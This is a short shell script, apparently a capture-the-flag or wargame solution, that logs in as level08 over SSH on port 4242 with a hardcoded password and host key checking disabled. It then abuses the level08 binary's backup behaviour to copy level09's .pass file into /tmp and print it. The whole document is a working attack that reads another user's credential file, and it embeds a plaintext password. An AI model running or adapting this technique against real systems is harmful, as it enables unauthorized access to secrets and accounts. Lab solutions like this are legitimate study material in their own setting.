#!/bin/sh
PASS='7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC'
sshpass -p $PASS ssh -q -tt -o StrictHostKeyChecking=no level08@$OVERRIDE -p 4242 << EOF
cd /tmp
mkdir -p backups/home/users/level09
~/./level08 /home/users/level09/.pass
echo -e "\e[32m\$(cat backups//home/users/level09/.pass)\e[39m"
exit
EOF